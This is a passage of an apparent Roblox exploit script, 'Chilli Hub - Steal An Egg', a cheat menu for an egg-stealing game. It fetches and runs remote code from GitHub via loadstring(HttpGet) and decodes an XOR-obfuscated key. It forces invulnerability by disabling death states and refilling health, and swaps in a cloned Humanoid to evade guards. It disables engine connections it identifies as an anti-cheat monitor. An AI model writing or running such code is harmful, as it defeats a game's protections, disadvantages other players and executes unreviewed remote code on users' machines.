local fn, v, v2, defaultTab, Players, RunService, ReplicatedStorage, CoreGui, UserInputService, localPlayer
local networking, fn2, tbl, v3, fn3, fn4, fn5, tbl2, tbl3, fn6
local n, n2, v4, v5, espSection, tbl4, n3, tbl5, tbl6, tbl7
local tbl8, v6, v7, v8, tbl9

do
	local CollectionService, ProximityPromptService, v9, v10, v11, tbl10, tbl11, tbl12, n4, n5
	local n6, tbl13, str, tbl14, tbl15, tbl16, tbl17, tbl18, tbl19, v12
	local v13, v14, createText, v15, v16, flag, tbl20, n7, tbl21, flag2
	local n8, tbl22, fn7, fn8

	do
		local v17, v18, v19, v20, v21

		do
			fn = function(arg)
				local genv = typeof(getgenv) == "function" and getgenv() or _G

				if type(genv.ChilliDebugPrint) == "function" then
					pcall(genv.ChilliDebugPrint, arg)
				end
			end

			task.spawn(pcall, function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/refs/heads/main/DiscordLink"))()
			end)

			local function fn9()
				local response = nil

				local function fn10()
					if type(response) == "string" and #response > 0 then
						return response
					end
					response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli%20Library")
					return response
				end

				local function fn11()
					local chilliHubSaeCleanup = (typeof(getgenv) == "function" and getgenv() or _G).ChilliHubSaeCleanup

					if type(chilliHubSaeCleanup) == "function" then
						pcall(chilliHubSaeCleanup)
					end

					local tbl23 = { game:GetService("CoreGui") }

					if typeof(gethui) == "function" then
						local ok, result = pcall(gethui)

						if ok and typeof(result) == "Instance" then
							table.insert(tbl23, result)
						end
					end

					local tbl24 = {
						Settings = true,
						ChilliLeftCenter = true,
						ChilliLibrarySettings = true,
						ChilliLibraryLauncher = true,
					}

					local n9 = 0

					for _, v22 in ipairs(tbl23) do
						for _, child in ipairs(v22:GetChildren()) do
							if child:IsA("ScreenGui") and (child:GetAttribute("ChilliLibraryOwned") == true or tbl24[child.Name]) then
								pcall(function()
									child:Destroy()
								end)

								n9 += 1
							end
						end
					end

					if n9 > 0 then
						fn("cleared " .. n9 .. " leftover Chilli UI screens")
					end
				end

				local function fn12()
					local v22 = fn10()
					local chunk, v23 = loadstring(v22)
					assert(chunk, v23)
					local v24 = chunk()
					assert(type(v24) == "function", "Chilli Library bootstrap is invalid.")
					local v25 = table.create(45)
					local n9 = 1

					for i = 1, 90, 2 do
						v25[n9] = string.char(bit32.bxor(tonumber(string.sub("306908100841206d474f00185f26635b2101387507010810127d7d477a473b6f435a0916573165562900226c00", i, i + 1), 16), string.byte("s9K!2vQ#", (n9 - 1) % 8 + 1)))
						n9 += 1
					end

					return v24(table.concat(v25))
				end

				local chilliLibraryFailedToLoad = "unknown"

				for i = 1, 6 do
					task.wait()
					pcall(fn11)
					local ok, result = pcall(fn12)
					if ok and type(result) == "table" then
						return result
					end
					chilliLibraryFailedToLoad = tostring(result)

					if type(chilliLibraryFailedToLoad) == "string" and string.find(chilliLibraryFailedToLoad, "HttpGet", 1, true) then
						response = nil
					end

					fn("library load attempt " .. i .. " failed: " .. chilliLibraryFailedToLoad)
					task.wait(1 + i * 0.5)
				end

				error("Chilli Library failed to load: " .. chilliLibraryFailedToLoad, 0)
			end

			v = fn9()
			assert(type(v) == "table" and type(v.CreateWindow) == "function" and type(v.Finalize) == "function", "Chilli Library returned an invalid API.")

			v.ManualQuickDefaults = {
				PinnedFeatures = { "Player > Movement > Speed Boost", "Player > Movement > Boost Speed" },
				Keybinds = { ["Player > Movement > Speed Boost"] = "Q" },
				PinGroups = {},
				LeftCenterHidden = true,
			}

			v2 = v:CreateWindow({ Name = "Chilli Hub - Steal An Egg", DefaultTab = "Farm" })
			defaultTab = v2:GetDefaultTab()
			Players = game:GetService("Players")
			RunService = game:GetService("RunService")
			ReplicatedStorage = game:GetService("ReplicatedStorage")
			CoreGui = game:GetService("CoreGui")
			UserInputService = game:GetService("UserInputService")
			CollectionService = game:GetService("CollectionService")
			game:GetService("LocalizationService")
			ProximityPromptService = game:GetService("ProximityPromptService")
			localPlayer = Players.LocalPlayer
			networking = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Networking")

			fn2 = function(arg)
				local ok, result = pcall(function()
					return require(arg())
				end)

				return ok and result or nil
			end

			tbl = {
				EggState = fn2(function()
					return ReplicatedStorage.Client.EggState
				end),
				AreaEggs = fn2(function()
					return ReplicatedStorage.Shared.Types.AreaEggs
				end),
				ToolGameplayGuard = fn2(function()
					return ReplicatedStorage.Client.ToolGameplayGuard
				end),
				Assets = fn2(function()
					return ReplicatedStorage.Data.Assets
				end),
				Guards = fn2(function()
					return ReplicatedStorage.Data.Guards
				end),
				EggRecords = fn2(function()
					return ReplicatedStorage.Shared.Util.EggRecords
				end),
				Mutations = fn2(function()
					return ReplicatedStorage.Shared.Modules.Mutations
				end),
				Save = fn2(function()
					return ReplicatedStorage.Shared.Save
				end),
				FuseKernel = fn2(function()
					return ReplicatedStorage.Shared.Util.FuseKernel
				end),
				AreaEggCycle = fn2(function()
					return ReplicatedStorage.Shared.Util.AreaEggCycle
				end),
				AreaEggResetWall = fn2(function()
					return ReplicatedStorage.Client.AreaEggResetWall
				end),
				AreaEggResetCycle = fn2(function()
					return ReplicatedStorage.Data.AreaEggResetCycle
				end),
				Gears = fn2(function()
					return ReplicatedStorage.Data.Gears
				end),
				Areas = fn2(function()
					return ReplicatedStorage.Data.Areas
				end),
				LimitedEgg = fn2(function()
					return ReplicatedStorage.Data.LimitedEgg
				end),
				BrainrotEgg = fn2(function()
					return ReplicatedStorage.Data.BrainrotEgg
				end),
				MonsterEgg = fn2(function()
					return ReplicatedStorage.Data.MonsterEgg
				end),
			}

			local function fn10()
				if typeof(gethui) == "function" then
					local ok, result = pcall(gethui)
					if ok and typeof(result) == "Instance" then
						return result
					end
				end

				return CoreGui
			end

			v3 = fn10()

			do
				local v22 = Random.new()
				local str2 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

				fn3 = function()
					local v23 = v22:NextInteger(12, 20)
					local v24 = table.create(v23)

					for i = 1, v23 do
						local v25 = v22:NextInteger(1, #str2)
						v24[i] = string.sub("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", v25, v25)
					end

					return table.concat(v24)
				end
			end

			do
				local tbl23 = {}

				fn4 = function(arg)
					table.insert(tbl23, arg)
				end

				local text = "All"

				fn5 = function(arg)
					if type(arg) ~= "table" then
						return arg
					end
					local value = rawget(arg, "Instance")
					if typeof(value) ~= "Instance" then
						return arg
					end
					local flag3 = false

					local function fn11(arg2)
						if flag3 then
							return
						end

						if arg2.Text == "None" then
							flag3 = true
							arg2.Text = text
							flag3 = false
						end
					end

					local function fn12(descendant)
						if not descendant:IsA("TextLabel") or descendant.Name ~= "Value" then
							return
						end
						fn11(descendant)

						local connection = descendant:GetPropertyChangedSignal("Text"):Connect(function()
							fn11(descendant)
						end)

						fn4(function()
							pcall(function()
								connection:Disconnect()
							end)
						end)
					end

					for _, descendant in ipairs(value:GetDescendants()) do
						fn12(descendant)
					end

					local connection = value.DescendantAdded:Connect(fn12)

					fn4(function()
						pcall(function()
							connection:Disconnect()
						end)
					end)

					return arg
				end

				local genv = typeof(getgenv) == "function" and getgenv() or _G
				local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup

				if type(chilliHubSaeCleanup) == "function" then
					pcall(chilliHubSaeCleanup)
				end

				genv.ChilliHubSaeCleanup = function()
					for i = #tbl23, 1, -1 do
						pcall(tbl23[i])
					end

					table.clear(tbl23)
				end
			end

			do
				local n9 = 0
				local fn11 = nil

				fn11 = function(arg, arg2)
					local n10 = arg2 or 0

					if type(arg) == "table" then
						if n10 > 3 then
							return
						end
						local n11 = 0

						for k, v22 in pairs(arg) do
							n11 += 1

							if not (n11 > 20) then
								fn11(k, n10 + 1)
								fn11(v22, n10 + 1)
								continue
							end

							break
						end
					elseif typeof(arg) == "Instance" then
						pcall(arg.GetFullName, arg)
					else
						n9 += #tostring(arg)
					end
				end

				local tbl23 = {}

				local function fn12(arg)
					tbl23[#tbl23 + 1] = arg
				end

				local function fn13()
					for _, v22 in ipairs(tbl23) do
						pcall(function()
							v22:Disconnect()
						end)
					end

					table.clear(tbl23)
				end

				local function chilliToolKeeper()
					fn13()

					for _, v22 in ipairs({
						"RE/GearSatchel/Lost",
						"RE/GearSatchel/Gained",
						"RE/RigSync/ProbeSatchel",
						"RE/RigSync/SeedSatchel",
						"RE/RigSync/CorrectionBegan",
						"RE/RigSync/Refresh",
						"RE/ToolTrigger/Trigger",
						"RE/BatSwing/Trigger",
					}) do
						local v23 = networking:FindFirstChild(v22)

						if v23 and v23:IsA("RemoteEvent") then
							fn12(v23.OnClientEvent:Connect(function(...)
								fn11({ ... })
							end))
						end
					end

					local function fn14(arg)
						if not arg then
							return
						end

						fn12(arg.ChildRemoved:Connect(function(child)
							if child:IsA("Tool") then
								fn11({ child.Name, child.Parent })
							end
						end))

						fn12(arg.ChildAdded:Connect(function(child)
							if child:IsA("Tool") then
								fn11({ child.Name })
							end
						end))
					end

					fn14(localPlayer:FindFirstChildOfClass("Backpack"))

					fn12(localPlayer.ChildAdded:Connect(function(child)
						if child:IsA("Backpack") then
							fn14(child)
						end
					end))

					task.spawn(function()
						pcall(function()
							local v22 = require(ReplicatedStorage.Shared.Save).Get()
							fn11({ v22.GearInventory, v22.Inventory }, 2)
						end)

						if type(getgc) == "function" then
							pcall(function()
								for _, v22 in ipairs(getgc(false)) do
									if type(v22) == "function" and islclosure(v22) then
										pcall(debug.info, v22, "n")
									end
								end
							end)
						end
					end)
				end
				;(typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper = chilliToolKeeper
				task.defer(chilliToolKeeper)
				fn4(fn13)
			end

			do
				local n9 = 0.35
				local n10 = 5
				local tbl23 = {}
				local flag3 = true

				tbl2 = {
					Add = function(arg)
						local tbl24 = { Run = arg, Gap = n9, Idle = n10, Repeat = false, Hold = 0 }
						table.insert(tbl23, tbl24)
						return tbl24
					end,
					Wake = function()
						flag3 = true
					end,
					Backoff = function(arg, arg2)
						if arg then
							arg.Hold = tonumber(arg2) or 6
						end
					end,
				}

				local connection = RunService.Heartbeat:Connect(function(deltaTime)
					local v22 = flag3
					flag3 = false

					for _, v23 in ipairs(tbl23) do
						v23.Gap = v23.Gap + deltaTime
						v23.Idle = v23.Idle + deltaTime

						if v23.Hold > 0 then
							v23.Hold = v23.Hold - deltaTime
						elseif v23.Gap >= n9 and (v22 or v23.Repeat or v23.Idle >= n10) then
							v23.Gap = 0
							v23.Idle = 0
							local ok, result = pcall(v23.Run, v23)
							v23.Repeat = ok and result == true
						end
					end
				end)

				fn4(function()
					connection:Disconnect()
				end)
			end

			v9 = defaultTab:CreateSection({ Name = "Dr Scramble Event", Expanded = false })
			local v22
			v22 = defaultTab:CreateSection({ Name = "Auto Steal", Expanded = true })
			v17 = defaultTab:CreateSection({ Name = "Auto Place Egg", Expanded = false })
			v18 = defaultTab:CreateSection({ Name = "Auto Treadmill", Expanded = false })
			v19 = defaultTab:CreateSection({ Name = "Auto Hatch & Equip", Expanded = false })
			v20 = defaultTab:CreateSection({ Name = "Auto Sell", Expanded = false })
			v21 = defaultTab:CreateSection({ Name = "Auto Fuse Machine", Expanded = false })
			v10 = defaultTab:CreateSection({ Name = "Auto Favorite", Expanded = false })
			v11 = defaultTab:CreateSection({ Name = "Auto Rift & Boss", Expanded = false })
			tbl10 = { Paused = false }

			do
				local n9 = 0.5
				local v23 = nil
				local tbl23 = nil
				local tbl24 = {}
				local flag3 = false
				local n10 = 0

				local function fn11()
					for i = #tbl24, 1, -1 do
						local v24 = tbl24[i]

						if v24 and v24.Connected then
							v24:Disconnect()
						end

						tbl24[i] = nil
					end
				end

				local function fn12()
					fn11()
					local v24 = v23
					local v25 = tbl23
					v23 = nil
					tbl23 = nil
					if not v24 or not v24.Parent or not v25 then
						return
					end

					pcall(function()
						v24.BreakJointsOnDeath = v25.BreakJointsOnDeath
						v24.RequiresNeck = v25.RequiresNeck
						v24:SetStateEnabled(Enum.HumanoidStateType.Dead, v25.DeadEnabled)
					end)
				end

				local function fn13(arg)
					if not arg or not arg.Parent then
						return false
					end

					return pcall(function()
						arg.BreakJointsOnDeath = false
						arg.RequiresNeck = false
						arg:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
					end) and arg.BreakJointsOnDeath == false and arg.RequiresNeck == false and arg:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
				end

				local function fn14(arg)
					if tbl10.Paused or arg ~= v23 or not arg or not arg.Parent or flag3 then
						return false
					end
					local maxHealth = arg.MaxHealth
					if maxHealth <= 0 then
						return false
					end

					if maxHealth == math.huge or arg.Health >= maxHealth then
						return true
					end
					flag3 = true

					local ok = pcall(function()
						arg.Health = maxHealth
					end)

					flag3 = false
					return ok and arg.Health >= maxHealth
				end

				local function fn15(arg)
					if arg == v23 and arg and arg.Parent then
						return true
					end
					fn12()
					if not arg or not arg:IsA("Humanoid") or not arg.Parent then
						return false
					end
					v23 = arg

					tbl23 = {
						BreakJointsOnDeath = arg.BreakJointsOnDeath,
						RequiresNeck = arg.RequiresNeck,
						DeadEnabled = arg:GetStateEnabled(Enum.HumanoidStateType.Dead),
					}

					if not fn13(arg) then
						fn12()
						return false
					end
					fn14(arg)

					tbl24[#tbl24 + 1] = arg.HealthChanged:Connect(function()
						fn14(arg)
					end)

					tbl24[#tbl24 + 1] = arg:GetPropertyChangedSignal("MaxHealth"):Connect(function()
						fn14(arg)
					end)

					tbl24[#tbl24 + 1] = arg.StateChanged:Connect(function(old, new)
						if new == Enum.HumanoidStateType.Dead and not tbl10.Paused then
							fn13(arg)
							fn14(arg)
						end
					end)

					n10 = os.clock()
					return true
				end

				local function fn16()
					local character = localPlayer.Character
					return character and character:FindFirstChildOfClass("Humanoid") or nil
				end

				local connection = localPlayer.CharacterAdded:Connect(function()
					task.defer(function()
						fn15(fn16())
					end)
				end)

				local connection2 = RunService.Heartbeat:Connect(function()
					local now = os.clock()
					if tbl10.Paused or now - n10 < n9 then
						return
					end
					n10 = now
					local v24 = fn16()
					if v24 ~= v23 then
						fn15(v24)
						return
					end

					if v24 then
						fn13(v24)
						fn14(v24)
					end
				end)

				task.defer(function()
					fn15(fn16())
				end)

				fn4(function()
					if connection then
						connection:Disconnect()
					end

					if connection2 then
						connection2:Disconnect()
					end

					fn12()
				end)
			end

			local tbl23 = { "bat", "katana", "axe", "staff", "club", "hammer", "sword", "blade" }

			tbl3 = {
				Steal = { Active = false, LastFinishedAt = 0, Carrying = false },
				Movement = {
					Owner = nil,
					PlaceWanted = false,
					StealFirst = false,
					MutationWanted = false,
					FracturedWanted = false,
				},
				AntiGuard = {
					Enabled = false,
					Busy = false,
					BusySince = 0,
					HitArms = 0,
					Handle = nil,
					Render = nil,
				},
				IsBatTool = function(arg)
					if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
						return false
					end

					if arg:GetAttribute("IsBat") == true then
						return true
					end
					local attribute = arg:GetAttribute("GearName")

					if type(attribute) == "string" then
						local gears = tbl.Gears
						local directory = type(gears) == "table" and gears.Directory or nil
						local flag3 = type(directory) == "table" and directory[attribute] or nil
						return type(flag3) == "table" and flag3.BatControllerData ~= nil
					end

					if arg:GetAttribute("ItemType") ~= nil then
						return false
					end
					local v23 = string.lower(arg.Name)

					for _, v24 in ipairs(tbl23) do
						if string.find(v23, v24, 1, true) then
							return true
						end
					end

					return false
				end,
				FindBat = function()
					local character = localPlayer.Character
					local tool = character and character:FindFirstChildWhichIsA("Tool")
					if tbl3.IsBatTool(tool) then
						return tool
					end
					local backpack = localPlayer:FindFirstChildOfClass("Backpack")

					if backpack then
						for _, child in ipairs(backpack:GetChildren()) do
							if tbl3.IsBatTool(child) then
								return child
							end
						end
					end

					if character then
						for _, child in ipairs(character:GetChildren()) do
							if tbl3.IsBatTool(child) then
								return child
							end
						end
					end

					return nil
				end,
				IsNight = function()
					local areaEggCycle = tbl.AreaEggCycle
					if type(areaEggCycle) ~= "table" or type(areaEggCycle.IsNightPhase) ~= "function" then
						return false
					end
					local ok, result = pcall(areaEggCycle.IsNightPhase, workspace:GetServerTimeNow())
					return ok and result == true
				end,
				WallSealed = function()
					local areaEggResetWall = tbl.AreaEggResetWall
					if type(areaEggResetWall) ~= "table" or type(areaEggResetWall.IsSealed) ~= "function" then
						return false
					end
					local ok, result = pcall(areaEggResetWall.IsSealed)
					return ok and result == true
				end,
				WallOpenDelay = function()
					local areaEggResetCycle = tbl.AreaEggResetCycle
					if type(areaEggResetCycle) ~= "table" then
						return 5
					end
					return (tonumber(areaEggResetCycle.WallCountdownDelayAfterDayStartsSeconds) or 2) + (tonumber(areaEggResetCycle.WallCountdownSeconds) or 3)
				end,
				ClaimMovement = function(owner)
					local movement = tbl3.Movement
					if movement.Owner == nil or movement.Owner == owner or movement.Owner == "treadmill" and owner ~= "treadmill" or movement.Owner == "scramble" and owner == "steal" then
						movement.Owner = owner
						return true
					end
					return false
				end,
				ReleaseMovement = function(arg)
					if tbl3.Movement.Owner == arg then
						tbl3.Movement.Owner = nil
					end
				end,
			}

			do
				local shieldMethods = { "Humanoid Swap", "Disable Monitor" }
				tbl3.ShieldMethods = shieldMethods
				local v23 = shieldMethods[1]
				local tbl24 = {}
				local tbl25 = {}
				local connection = nil
				local n9 = 0
				local tbl26 = { Original = nil, Clone = nil, Links = {} }
				local connection2 = nil
				local tbl27 = {}

				local function fn11()
					for _, v24 in ipairs(tbl27) do
						task.defer(function()
							pcall(v24)
						end)
					end
				end

				tbl3.OnHumanoidChanged = function(arg)
					table.insert(tbl27, arg)
					local tbl28

					tbl28 = {
						Connected = true,
						Disconnect = function()
							tbl28.Connected = false
							local v24 = table.find(tbl27, arg)

							if v24 then
								table.remove(tbl27, v24)
							end
						end,
					}

					return tbl28
				end

				local function fn12(humanoid)
					pcall(function()
						local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
						playerScripts = playerScripts and playerScripts:FindFirstChild("PlayerModule")

						if playerScripts then
							local controls = require(playerScripts):GetControls()

							if type(controls) == "table" then
								controls.humanoid = humanoid
							end
						end
					end)
				end

				local function fn13(arg)
					local animate = arg and arg:FindFirstChild("Animate")

					if animate and animate:IsA("LocalScript") then
						task.spawn(function()
							animate.Enabled = false
							task.wait()
							animate.Enabled = true
						end)
					end
				end

				local function fn14()
					for _, link in ipairs(tbl26.Links) do
						pcall(function()
							link:Disconnect()
						end)
					end

					table.clear(tbl26.Links)
				end

				tbl3.UndoSwap = function()
					fn14()
					local character = localPlayer.Character
					local original = tbl26.Original
					local clone = tbl26.Clone
					local v24 = tbl26
					tbl26.Original = nil
					v24.Clone = nil

					if original and clone and character and original.Parent == nil and clone.Parent == character then
						original.Parent = character
						workspace.CurrentCamera.CameraSubject = original
						fn12(original)

						pcall(function()
							clone:Destroy()
						end)

						fn13(character)
						fn11()
					end
				end

				local tbl28 = {
					[Enum.HumanoidStateType.Running] = true,
					[Enum.HumanoidStateType.RunningNoPhysics] = true,
					[Enum.HumanoidStateType.Landed] = true,
				}

				tbl3.Grounded = function(arg)
					if not arg then
						arg = localPlayer.Character
						arg = arg and arg:FindFirstChildOfClass("Humanoid")
					end

					if not arg or arg.Health <= 0 or arg.FloorMaterial == Enum.Material.Air then
						return false
					end
					return tbl28[arg:GetState()] == true
				end

				tbl3.ShieldPaused = false

				local function fn15()
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")
					if not humanoid or humanoid.Health <= 0 then
						return
					end

					if tbl26.Clone and tbl26.Clone.Parent == character then
						return
					end

					if not tbl3.Grounded(humanoid) then
						return
					end
					local clone = humanoid:Clone()
					humanoid.Parent = nil
					clone.Parent = character
					workspace.CurrentCamera.CameraSubject = clone
					fn12(clone)
					fn13(character)
					local v24 = tbl26
					tbl26.Original = humanoid
					v24.Clone = clone
					fn11()
					local animator = humanoid:FindFirstChildOfClass("Animator")
					local animator2 = clone:FindFirstChildOfClass("Animator")

					if animator and animator2 then
						table.insert(tbl26.Links, animator.AnimationPlayed:Connect(function(arg)
							local animation = arg.Animation
							if not animation or clone.Parent == nil then
								return
							end

							local ok, result = pcall(function()
								return animator2:LoadAnimation(animation)
							end)

							if not ok or not result then
								return
							end

							pcall(function()
								result.Priority = arg.Priority
								result.Looped = arg.Looped
								local speed = arg.Speed
								result:Play(0.05, math.max(arg.WeightTarget, 0.01), speed)
							end)

							local connection3 = nil

							connection3 = arg.Stopped:Connect(function()
								connection3:Disconnect()

								pcall(function()
									result:Stop(0.1)
								end)
							end)
						end))
					end

					table.insert(tbl26.Links, clone.Died:Connect(function()
						fn14()
						local v25 = tbl26
						tbl26.Original = nil
						v25.Clone = nil
						local character2 = localPlayer.Character

						if character2 and humanoid.Parent == nil then
							humanoid.Parent = character2
							workspace.CurrentCamera.CameraSubject = humanoid
							fn12(humanoid)
							fn11()
						end

						pcall(function()
							clone:Destroy()
						end)

						humanoid.Health = 0
					end))
				end

				local function fn16()
					if type(getconnections) ~= "function" then
						return
					end

					for _, v24 in ipairs({ RunService.Heartbeat, RunService.PreSimulation, RunService.PostSimulation }) do
						local ok, result = pcall(getconnections, v24)

						if ok and type(result) == "table" then
							for _, v25 in ipairs(result) do
								local ok2, result2 = pcall(function()
									return v25.Function
								end)

								local flag3 = ok2 and type(result2) == "function"
								local flag4 = false
								local result3 = nil

								if flag3 then
									flag4, result3 = pcall(debug.info, result2, "s")
								end

								if flag4 and string.find(tostring(result3), "UGI", 1, true) then
									local ok3, result4 = pcall(function()
										return v25.Enabled
									end)

									if not ok3 or result4 ~= false then
										if pcall(function()
											v25:Disable()
										end) then
											table.insert(tbl25, v25)
										end
									end
								end
							end
						end
					end
				end

				local function fn17()
					if connection then
						connection:Disconnect()
						connection = nil
					end

					if connection2 then
						connection2:Disconnect()
						connection2 = nil
					end

					for _, v24 in ipairs(tbl25) do
						pcall(function()
							v24:Enable()
						end)
					end

					table.clear(tbl25)
				end

				local function fn18()
					if tbl3.ShieldPaused then
						return
					end

					if v23 == shieldMethods[1] then
						fn15()
					else
						fn16()
					end
				end

				local function fn19()
					fn18()
					n9 = 0

					connection = RunService.Heartbeat:Connect(function(deltaTime)
						n9 += deltaTime
						local character = localPlayer.Character
						local flag3 = v23 == shieldMethods[1]

						if flag3 then
							flag3 = not (tbl26.Clone and character and tbl26.Clone.Parent == character)
						end

						if (flag3 and 0.25 or 3) <= n9 then
							n9 = 0
							fn18()
						end
					end)

					connection2 = localPlayer.CharacterAdded:Connect(function(character)
						fn14()
						local v24 = tbl26
						tbl26.Original = nil
						v24.Clone = nil
						if v23 ~= shieldMethods[1] then
							return
						end

						task.spawn(function()
							character:WaitForChild("Humanoid", 10)
							task.wait(1)

							if connection and localPlayer.Character == character then
								fn18()
							end
						end)
					end)
				end

				tbl3.Swapped = function()
					if v23 ~= shieldMethods[1] then
						return true
					end
					local character = localPlayer.Character
					return tbl26.Clone ~= nil and character ~= nil and tbl26.Clone.Parent == character
				end

				tbl3.Shield = function(arg, arg2)
					tbl24[arg] = arg2 == true or nil
					if next(tbl24) == nil then
						fn17()
						return
					end

					if connection then
						return
					end
					fn19()
				end

				tbl3.SetShieldMethod = function(arg)
					if not table.find(shieldMethods, arg) or arg == v23 then
						return
					end
					local flag3 = connection ~= nil
					fn17()
					v23 = arg

					if flag3 and next(tbl24) ~= nil then
						fn19()
					end
				end

				fn4(fn17)
			end

			tbl3.Shield("load", true)

			tbl3.Toggle = function(arg, arg2)
				if type(arg) ~= "table" then
					return arg2 == true
				end

				local ok, result = pcall(function()
					local controller = arg._controller
					return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
				end)

				if ok and type(result) == "boolean" then
					return result
				end

				for _, v23 in ipairs({ "Get", "GetValue" }) do
					local ok2, result2 = pcall(function()
						return arg[v23]
					end)

					if ok2 and type(result2) == "function" then
						local ok3, result3 = pcall(result2, arg)
						if ok3 and type(result3) == "boolean" then
							return result3
						end
					end
				end

				return arg2 == true
			end

			tbl3.Root = function()
				local character = localPlayer.Character
				character = character and character:FindFirstChild("HumanoidRootPart")
				return character and character:IsDescendantOf(workspace) and character or nil
			end

			tbl3.PlacedPoints = function()
				local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
				local tbl24 = {}
				if not placedEggRenders then
					return tbl24
				end
				local str2 = tostring(localPlayer.UserId)

				for _, child in ipairs(placedEggRenders:GetChildren()) do
					if string.find(child.Name, str2, 1, true) then
						local ok, result = pcall(function()
							return child:IsA("Model") and child:GetPivot() or child.CFrame
						end)

						if ok then
							table.insert(tbl24, result.Position)
						end
					end
				end

				return tbl24
			end

			tbl3.OwnPlot = function()
				local plots = workspace:FindFirstChild("Plots")
				if not plots then
					return nil
				end

				for _, child in ipairs(plots:GetChildren()) do
					local plotSign = child:FindFirstChild("PlotSign")
					plotSign = plotSign and plotSign:FindFirstChild("PlayerPlotSign")
					plotSign = plotSign and plotSign:FindFirstChild("Frame")
					plotSign = plotSign and plotSign:FindFirstChild("PlayerName")

					if plotSign and plotSign:IsA("TextLabel") then
						local v23 = string.lower(plotSign.Text)
						if v23 == string.lower(localPlayer.Name) or v23 == string.lower(localPlayer.DisplayName) then
							return child
						end
					end
				end

				return nil
			end

			local function fn11()
				local v23 = tbl3.PlacedPoints()
				if #v23 == 0 then
					return nil
				end
				local vector = Vector3.zero

				for _, v24 in ipairs(v23) do
					vector += v24
				end

				return vector / #v23
			end

			tbl3.PenAnchor = function()
				local v23 = fn11()
				if v23 then
					return v23
				end
				local v24 = tbl3.OwnPlot()
				if not v24 then
					return nil
				end
				local toUpdate = v24:FindFirstChild("ToUpdate")
				local starterPen = toUpdate and toUpdate:FindFirstChild("StarterPen") or v24:FindFirstChild("CenterPoint")
				if not starterPen then
					return nil
				end

				local ok, result = pcall(function()
					return starterPen:IsA("Model") and starterPen:GetPivot() or starterPen.CFrame
				end)

				return ok and result.Position or nil
			end

			tbl3.Plot = function()
				local v23 = tbl3.OwnPlot()
				if v23 then
					return v23
				end
				local plots = workspace:FindFirstChild("Plots")
				local v24 = fn11()
				if not plots or not v24 then
					return nil
				end
				local huge = math.huge
				local v25 = nil

				for _, child in ipairs(plots:GetChildren()) do
					local ok, result, result2 = pcall(function()
						return child:GetBoundingBox()
					end)

					if ok and result and result2 then
						local v26 = result:PointToObjectSpace(v24)
						local n9 = result2.X / 2
						local flag3 = math.abs(v26.X) <= n9

						if flag3 then
							local n10 = result2.Z / 2
							flag3 = math.abs(v26.Z) <= n10
						end

						if flag3 then
							return child
						end
						local magnitude = (result.Position - v24).Magnitude

						if magnitude < huge then
							v25 = child
							huge = magnitude
						end
					end
				end

				if v25 and huge <= 60 then
					return v25
				end
				return nil
			end

			tbl3.Belt = function()
				local v23 = tbl3.Plot()
				if not v23 then
					return nil
				end
				local treadmillBottom = v23:FindFirstChild("TreadmillBottom")
				if treadmillBottom and treadmillBottom:IsA("BasePart") then
					return treadmillBottom
				end
				local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
				clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. v23.Name)
				local primaryPart

				if clientTreadmillRenders then
					local boundingBoxPart = clientTreadmillRenders:FindFirstChild("BoundingBoxPart")

					if boundingBoxPart then
						primaryPart = boundingBoxPart
					else
						primaryPart = clientTreadmillRenders:IsA("Model") and clientTreadmillRenders.PrimaryPart
					end

					primaryPart = primaryPart or clientTreadmillRenders:FindFirstChildWhichIsA("BasePart")
				else
					primaryPart = clientTreadmillRenders
				end

				if primaryPart then
					return primaryPart
				end
				local treadmillUpgrade = v23:FindFirstChild("TreadmillUpgrade")
				return treadmillUpgrade and treadmillUpgrade:FindFirstChildWhichIsA("BasePart") or nil
			end

			tbl3.DistanceTo = function(arg)
				local v23 = tbl3.Root()
				if not v23 or not arg then
					return math.huge
				end
				return (v23.Position - arg).Magnitude
			end

			do
				local tbl24 = {}
				local n9 = 0

				local function fn12()
					local v23 = tbl3.Plot()
					if not v23 then
						return {}
					end
					local tbl25 = {}

					for _, v24 in ipairs({ "TreadmillBottom", "TreadmillUpgrade" }) do
						local v25 = v23:FindFirstChild(v24)

						if v25 then
							if v25:IsA("BasePart") then
								table.insert(tbl25, v25)
							else
								for _, descendant in ipairs(v25:GetDescendants()) do
									if descendant:IsA("BasePart") then
										table.insert(tbl25, descendant)
									end
								end
							end
						end
					end

					local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
					clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. v23.Name)

					if clientTreadmillRenders then
						for _, descendant in ipairs(clientTreadmillRenders:GetDescendants()) do
							if descendant:IsA("BasePart") then
								table.insert(tbl25, descendant)
							end
						end
					end

					return tbl25
				end

				local function fn13()
					for _, v23 in ipairs(fn12()) do
						if not tbl24[v23] then
							tbl24[v23] = {
								CFrame = v23.CFrame,
								CanTouch = v23.CanTouch,
								CanCollide = v23.CanCollide,
								Transparency = v23.Transparency,
							}

							pcall(function()
								v23.CanTouch = false
								v23.CanCollide = false
								v23.Transparency = 1
								v23.CFrame = v23.CFrame - Vector3.new(0, 120, 0)
							end)
						end
					end
				end

				local function fn14()
					for k, v23 in pairs(tbl24) do
						if k and k.Parent then
							pcall(function()
								k.CFrame = v23.CFrame
								k.CanTouch = v23.CanTouch
								k.CanCollide = v23.CanCollide
								k.Transparency = v23.Transparency
							end)
						end
					end

					table.clear(tbl24)
				end

				tbl3.HoldBelt = function()
					n9 += 1
					fn13()
				end

				tbl3.ReleaseBelt = function()
					n9 = math.max(0, n9 - 1)

					if n9 == 0 then
						fn14()
					end
				end

